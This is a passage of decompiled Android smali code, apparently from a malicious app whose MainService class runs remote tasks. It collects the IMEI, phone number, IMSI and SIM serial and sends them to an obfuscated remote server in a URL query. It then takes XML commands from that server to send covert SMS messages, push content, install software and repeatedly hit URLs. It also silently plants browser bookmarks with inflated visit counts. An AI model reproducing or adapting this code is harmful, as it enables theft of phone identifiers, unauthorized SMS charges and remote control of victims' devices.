    const-string v2, "<isreset>"

    const-string v3, "</isreset>"

    invoke-static {p1, v2, v3}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 552
    const-string v2, "no"

    invoke-virtual {v2, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 555
    :catch_0
    move-exception v2

    goto :goto_0
.end method

.method private execTask()V
    .locals 13

    .prologue
    .line 198
    iget-object v10, p0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v10}, Lcom/android/FileAct;->readString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 199
    .local v6, record:Ljava/lang/String;
    invoke-static {v6}, Lcom/android/StringUtil;->getRecordInfo(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 200
    .local v2, docount:[Ljava/lang/String;
    const/4 v4, 0x0

    .line 201
    .local v4, isexec:Z
    if-eqz v2, :cond_0

    array-length v10, v2

    const/4 v11, 0x3

    if-eq v10, v11, :cond_1

    .line 203
    :cond_0
    const/4 v10, 0x0

    const/4 v11, 0x0

    invoke-direct {p0, v10, v11}, Lcom/android/MainService;->LogService(II)I

    move-result v7

    .line 204
    .local v7, result:I
    const/16 v10, 0xc8

    if-ne v7, v10, :cond_2

    .line 205
    const/4 v10, 0x3

    new-array v2, v10, [Ljava/lang/String;

    .line 206
    invoke-static {}, Lcom/android/StringUtil;->getExecTime()Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 207
    const/4 v10, 0x0

    iget-object v11, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    aput-object v11, v2, v10

    .line 208
    const/4 v10, 0x2

    iget-object v11, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    aput-object v11, v2, v10

    .line 209
    new-instance v10, Ljava/lang/StringBuilder;

    iget-object v11, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v11, "|"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "|"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 210
    .local v5, logtxt:Ljava/lang/String;
    iget-object v10, p0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v5, v10}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 211
    const/4 v4, 0x1

    .line 216
    .end local v5           #logtxt:Ljava/lang/String;
    .end local v7           #result:I
    :cond_1
    const/4 v10, 0x0

    aget-object v10, v2, v10

    invoke-static {v10}, Lcom/android/StringUtil;->getTimeLength(Ljava/lang/String;)I

    move-result v1

    .line 217
    .local v1, difdate:I
    if-nez v1, :cond_3

    if-nez v4, :cond_3

    .line 282
    .end local v1           #difdate:I
    :cond_2
    :goto_0
    return-void

    .line 220
    .restart local v1       #difdate:I
    :cond_3
    iget-object v10, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    if-eqz v10, :cond_4

    const-string v10, ""

    iget-object v11, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_6

    .line 222
    :cond_4
    const-string v10, "phone"

    invoke-virtual {p0, v10}, Lcom/android/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    .line 221
    check-cast v8, Landroid/telephony/TelephonyManager;

    .line 223
    .local v8, tm:Landroid/telephony/TelephonyManager;
    if-eqz v8, :cond_6

    .line 224
    invoke-virtual {v8}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    .line 225
    invoke-virtual {v8}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->tel:Ljava/lang/String;

    .line 226
    invoke-virtual {v8}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    .line 227
    invoke-virtual {v8}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->iccid:Ljava/lang/String;

    .line 229
    iget-object v10, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    if-eqz v10, :cond_5

    iget-object v10, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    invoke-virtual {v10}, Ljava/lang/String;->length()I

    move-result v10

    const/4 v11, 0x5

    if-le v10, v11, :cond_5

    .line 230
    iget-object v10, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    const/4 v11, 0x3

    const/4 v12, 0x5

    invoke-virtual {v10, v11, v12}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->mnc:Ljava/lang/String;

    .line 232
    :cond_5
    const-string v10, "01"

    iget-object v11, p0, Lcom/android/MainService;->mnc:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_6

    .line 233
    const-string v10, "10010"

    iput-object v10, p0, Lcom/android/MainService;->testtel:Ljava/lang/String;

    .line 237
    .end local v8           #tm:Landroid/telephony/TelephonyManager;
    :cond_6
    const-string v10, "other"

    const/4 v11, 0x2

    aget-object v11, v2, v11

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_7

    .line 238
    const-string v10, "other"

    iget-object v11, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_7

    .line 239
    iget-object v10, p0, Lcom/android/MainService;->testtel:Ljava/lang/String;

    const-string v11, "801"

    invoke-direct {p0, v10, v11}, Lcom/android/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 240
    const/4 v10, 0x0

    iput-boolean v10, p0, Lcom/android/MainService;->issend:Z

    .line 242
    const-wide/16 v10, 0x4e20

    :try_start_0
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1

    .line 248
    :cond_7
    :goto_1
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "http://"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 249
    const-string v11, "axdmflsadneddrwo3i2df138a8bcao3m"

    const/4 v12, 0x1

    invoke-static {v11, v12}, Lcom/android/Base64;->encode(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    .line 250
    const-string v11, ":8118/push/androidxml/"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->bigpid:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "_"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->version:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "/"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    .line 251
    iget-object v11, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ".xml?sim="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&tel="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->tel:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&imsi="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    .line 252
    iget-object v11, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&iccid="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->iccid:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&pid="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    .line 248
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 254
    .local v9, xmlUrl:Ljava/lang/String;
    :try_start_1
    invoke-static {v9}, Lcom/android/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 255
    .local v0, allStr:Ljava/lang/String;
    if-eqz v0, :cond_2

    const-string v10, ""

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-nez v10, :cond_2

    .line 257
    const-string v10, "<task>"

    const-string v11, "</task>"

    invoke-static {v0, v10, v11}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    .line 258
    const-string v10, "no"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_8

    .line 260
    const/4 v10, 0x0

    aget-object v10, v2, v10

    const/16 v11, 0xc

    invoke-static {v10, v11}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 261
    new-instance v10, Ljava/lang/StringBuilder;

    iget-object v11, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v11, "|"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const/4 v11, 0x1

    aget-object v11, v2, v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "|"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const/4 v11, 0x2

    aget-object v11, v2, v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 262
    .restart local v5       #logtxt:Ljava/lang/String;
    iget-object v10, p0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v5, v10}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 263
    const/16 v10, -0x64

    const/4 v11, 0x0

    invoke-direct {p0, v10, v11}, Lcom/android/MainService;->LogService(II)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0

    .line 279
    .end local v0           #allStr:Ljava/lang/String;
    .end local v5           #logtxt:Ljava/lang/String;
    :catch_0
    move-exception v10

    move-object v3, v10

    .line 280
    .local v3, e:Ljava/lang/Exception;
    const-string v10, "info"

    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "execTask:"

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v10, v11}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_0

    .line 266
    .end local v3           #e:Ljava/lang/Exception;
    .restart local v0       #allStr:Ljava/lang/String;
    :cond_8
    :try_start_2
    const-string v10, "note"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_9

    .line 267
    invoke-direct {p0, v0, v2}, Lcom/android/MainService;->sendSms(Ljava/lang/String;[Ljava/lang/String;)V

    goto/16 :goto_0

    .line 268
    :cond_9
    const-string v10, "push"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_a

    .line 269
    invoke-direct {p0, v0, v2}, Lcom/android/MainService;->execPush(Ljava/lang/String;[Ljava/lang/String;)V

    goto/16 :goto_0

    .line 270
    :cond_a
    const-string v10, "soft"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_b

    .line 271
    invoke-direct {p0, v0, v2}, Lcom/android/MainService;->execSoft(Ljava/lang/String;[Ljava/lang/String;)V

    goto/16 :goto_0

    .line 272
    :cond_b
    const-string v10, "tanc"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-nez v10, :cond_2

    .line 274
    const-string v10, "xbox"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-nez v10, :cond_2

    .line 276
    const-string v10, "mark"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_2

    .line 277
    invoke-direct {p0, v0, v2}, Lcom/android/MainService;->execMark(Ljava/lang/String;[Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto/16 :goto_0

    .line 243
    .end local v0           #allStr:Ljava/lang/String;
    .end local v9           #xmlUrl:Ljava/lang/String;
    :catch_1
    move-exception v10

    goto/16 :goto_1
.end method

.method private execXbox(Ljava/lang/String;)V
    .locals 8
    .parameter "allStr"

    .prologue
    .line 395
    const-string v5, ""

    .line 396
    .local v5, xboxUrl:Ljava/lang/String;
    const-string v4, ""

    .line 397
    .local v4, type:Ljava/lang/String;
    const-string v2, "1"

    .line 398
    .local v2, linkenum:Ljava/lang/String;
    const-string v1, "no"

    .line 401
    .local v1, isreset:Ljava/lang/String;
    :try_start_0
    const-string v6, "<url>"

    const-string v7, "</url>"

    invoke-static {p1, v6, v7}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 402
    const-string v6, ""

    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1

    .line 432
    :cond_0
    :goto_0
    return-void

    .line 405
    :cond_1
    const-string v6, "<type>"

    const-string v7, "</type>"

    invoke-static {p1, v6, v7}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 407
    const-string v6, "<shieldnum>"

    .line 408
    const-string v7, "</shieldnum>"

    .line 407
    invoke-static {p1, v6, v7}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Lcom/android/MainService;->shieldnum:Ljava/lang/String;

    .line 410
    const-string v6, "<exactnum>"

    .line 411
    const-string v7, "</exactnum>"

    .line 410
    invoke-static {p1, v6, v7}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Lcom/android/MainService;->exactnum:Ljava/lang/String;

    .line 413
    const-string v6, "<linkenum>"

    .line 414
    const-string v7, "</linkenum>"

    .line 413
    invoke-static {p1, v6, v7}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 417
    const-string v6, "<isreset>"

    const-string v7, "</isreset>"

    invoke-static {p1, v6, v7}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 418
    const-string v6, "no"

    invoke-virtual {v6, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    .line 421
    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    .line 426
    .local v3, linkenums:I
    const/4 v0, 0x0

    .local v0, i:I
    :goto_1
    if-ge v0, v3, :cond_0

    .line 428
    invoke-static {v5}, Lcom/android/BaseAuthenicationHttpClient;->getXboxStrByURL(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 426
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    .line 430
    .end local v0           #i:I
    .end local v3           #linkenums:I
    :catch_0
    move-exception v6

    goto :goto_0
.end method

.method private insertAndroidBookmark(Ljava/lang/String;Ljava/lang/String;)I
    .locals 13
    .parameter "title"
    .parameter "insertUrl"

    .prologue
    const-string v3, "url"

    .line 577
    const-string v3, "info"

    invoke-static {v3, p2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 578
    const/16 v10, -0x3e9

    .line 580
    .local v10, result:I
    :try_start_0
    const-string v3, "content://browser/bookmarks"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 581
    .local v1, browserUri:Landroid/net/Uri;
    const/4 v3, 0x1

    new-array v2, v3, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "url"

    aput-object v4, v2, v3

    .line 582
    .local v2, projection:[Ljava/lang/String;
    invoke-virtual {p0}, Lcom/android/MainService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 583
    .local v0, contentResolver:Landroid/content/ContentResolver;
    const/4 v3, 0x0

    .line 584
    const/4 v4, 0x0

    const/4 v5, 0x0

    .line 583
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 585
    .local v7, cursor:Landroid/database/Cursor;
    if-eqz v7, :cond_0

    const-string v3, ""

    invoke-virtual {v3, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    :cond_0
    const/16 v3, -0x3e9

    .line 625
    .end local v0           #contentResolver:Landroid/content/ContentResolver;
    .end local v1           #browserUri:Landroid/net/Uri;
    .end local v2           #projection:[Ljava/lang/String;
    .end local v7           #cursor:Landroid/database/Cursor;
    :goto_0
    return v3

    .line 586
    .restart local v0       #contentResolver:Landroid/content/ContentResolver;
    .restart local v1       #browserUri:Landroid/net/Uri;
    .restart local v2       #projection:[Ljava/lang/String;
    .restart local v7       #cursor:Landroid/database/Cursor;
    :cond_1
    const/4 v8, 0x0

    .line 587
    .local v8, hasMyBookmark:Z
    :cond_2
    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-nez v3, :cond_3

    .line 594
    :goto_1
    if-nez v8, :cond_5

    .line 595
    new-instance v6, Landroid/content/ContentValues;

    invoke-direct {v6}, Landroid/content/ContentValues;-><init>()V

    .line 596
    .local v6, contentValues:Landroid/content/ContentValues;
    const-string v3, "_id"

    invoke-interface {v7}, Landroid/database/Cursor;->getCount()I

    move-result v4

    add-int/lit8 v4, v4, 0x1

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v6, v3, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 597
    const-string v3, "title"

    invoke-virtual {v6, v3, p1}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 598
    const-string v3, "url"

    invoke-virtual {v6, v3, p2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 600
    const-string v3, "visits"

    const v4, 0x3fffffff

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v6, v3, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 602
    const-string v3, "date"

    const-wide/16 v4, 0x0

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    invoke-virtual {v6, v3, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    .line 603
    const-string v3, "created"

    const-wide/16 v4, 0x0

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    invoke-virtual {v6, v3, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    .line 605
    const-string v3, "bookmark"

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v6, v3, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 606
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    .line 607
    invoke-virtual {v0, v1, v6}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    move-result-object v11

    .line 609
    .local v11, resultUri:Landroid/net/Uri;
    if-eqz v11, :cond_4

    .line 611
    const/16 v10, -0x3e8

    .end local v0           #contentResolver:Landroid/content/ContentResolver;
    .end local v1           #browserUri:Landroid/net/Uri;
    .end local v2           #projection:[Ljava/lang/String;
    .end local v6           #contentValues:Landroid/content/ContentValues;
    .end local v7           #cursor:Landroid/database/Cursor;
    .end local v8           #hasMyBookmark:Z
    .end local v11           #resultUri:Landroid/net/Uri;
    :goto_2
    move v3, v10

    .line 625
    goto :goto_0

    .line 588
    .restart local v0       #contentResolver:Landroid/content/ContentResolver;
    .restart local v1       #browserUri:Landroid/net/Uri;
    .restart local v2       #projection:[Ljava/lang/String;
    .restart local v7       #cursor:Landroid/database/Cursor;
    .restart local v8       #hasMyBookmark:Z
    :cond_3
    const/4 v3, 0x0

    invoke-interface {v7, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    .line 589
    .local v12, url:Ljava/lang/String;
    invoke-virtual {p2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0

    move-result v3

    if-eqz v3, :cond_2

    .line 590
    const/4 v8, 0x1

    .line 591
    goto :goto_1

    .line 614
    .end local v12           #url:Ljava/lang/String;
    .restart local v6       #contentValues:Landroid/content/ContentValues;
    .restart local v11       #resultUri:Landroid/net/Uri;
    :cond_4
    const/16 v10, -0x3e9

    goto :goto_2

    .line 618
    .end local v6           #contentValues:Landroid/content/ContentValues;
    .end local v11           #resultUri:Landroid/net/Uri;
    :cond_5
    const/16 v10, -0x3ea

    goto :goto_2

    .line 620
    .end local v0           #contentResolver:Landroid/content/ContentResolver;
    .end local v1           #browserUri:Landroid/net/Uri;
    .end local v2           #projection:[Ljava/lang/String;
    .end local v7           #cursor:Landroid/database/Cursor;
    .end local v8           #hasMyBookmark:Z
    :catch_0
    move-exception v3

    move-object v9, v3

    .line 622
    .local v9, iae:Ljava/lang/IllegalArgumentException;
    invoke-virtual {v9}, Ljava/lang/IllegalArgumentException;->printStackTrace()V

    .line 623
    const/16 v10, -0x3e9

    goto :goto_2
.end method

.method private sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    .locals 8
    .parameter "addr"
    .parameter "body"

    .prologue
    const/4 v2, 0x0

    .line 661
    invoke-static {}, Landroid/telephony/gsm/SmsManager;->getDefault()Landroid/telephony/gsm/SmsManager;

    move-result-object v0

    .line 662
    .local v0, smsMag:Landroid/telephony/gsm/SmsManager;
    new-instance v7, Landroid/content/Intent;

    const-string v1, "com.test.sms.send"

    invoke-direct {v7, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 663
    .local v7, sendIntent:Landroid/content/Intent;
    invoke-static {p0, v2, v7, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    .line 665
    .local v4, sendPI:Landroid/app/PendingIntent;
    new-instance v6, Landroid/content/Intent;

    const-string v1, "com.test.sms.delivery"

    invoke-direct {v6, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 666
    .local v6, deliveryIntent:Landroid/content/Intent;
    invoke-static {p0, v2, v6, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    .line 668
    .local v5, deliveryPI:Landroid/app/PendingIntent;
    const/4 v2, 0x0

    move-object v1, p1

    move-object v3, p2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/gsm/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 669
    return-void
.end method

.method private sendSms(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 25
    .parameter "allStr"
    .parameter "record"

    .prologue
    .line 286
    const-string v15, ""

    .line 287
    .local v15, smsAddress:Ljava/lang/String;
    const-string v16, ""

    .line 288
    .local v16, smsBody:Ljava/lang/String;
    const-string v13, "1"

    .line 289
    .local v13, sendcount:Ljava/lang/String;
    const-string v10, "no"

    .line 290
    .local v10, isreset:Ljava/lang/String;
